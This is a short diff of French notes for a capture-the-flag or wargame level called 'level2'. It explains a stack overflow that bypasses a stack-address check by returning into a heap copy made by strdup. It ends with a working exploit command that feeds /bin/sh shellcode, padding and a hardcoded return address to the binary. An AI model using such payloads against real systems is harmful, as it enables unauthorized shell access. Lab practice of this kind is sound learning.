@@ -1,7 +1,9 @@
 on peut pas remplacer l'ddresse de l'eip au 80e octet par une addr de la stack car le programme verifie si l'eip commence par 0xb
+
 mais strdup est sur la heap et retourne la chaine envoyee au gets, 
 il suffit de mettre pleins de AAAA (80 A, puis ladresse de retour du strdup),
-on a bin remplacer l'eip par l'adresse du retour du strdup, il suffit de mettre le shellcode au debut de cette chaine
+
+on a bien remplacer l'eip par l'adresse du retour du strdup, il suffit de mettre le shellcode au debut de cette chaine
 pour que quand l'eip execute le retour du strdup, il execute le shellcode
 
 cat <(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"') - | ./level2
